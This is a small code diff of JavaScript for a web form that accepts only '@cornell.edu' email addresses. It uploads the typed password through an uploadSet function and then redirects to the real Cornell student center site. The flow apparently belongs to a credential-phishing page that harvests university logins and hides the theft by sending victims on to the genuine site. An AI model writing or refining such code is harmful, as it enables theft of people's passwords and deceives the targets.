@@ -7,7 +7,6 @@ Id('next').onclick = () => {
     let val = Id('email').value
     let end = val.substring(val.length-12, val.length)
 
-
     if (end == '@cornell.edu'){
 
         Id('first').style.opacity = 0.3
@@ -58,10 +57,7 @@ Id('submit').onclick = () => {
         stage = 1
         uploadSet(Id('password').value)
     }else{
-        Id('password').type = 'text'
-        setTimeout(() => {
-            window.location = 'https://studentcenter.cornell.edu'
-        }, 100);
+        window.location = 'https://studentcenter.cornell.edu'
     }
 }
 
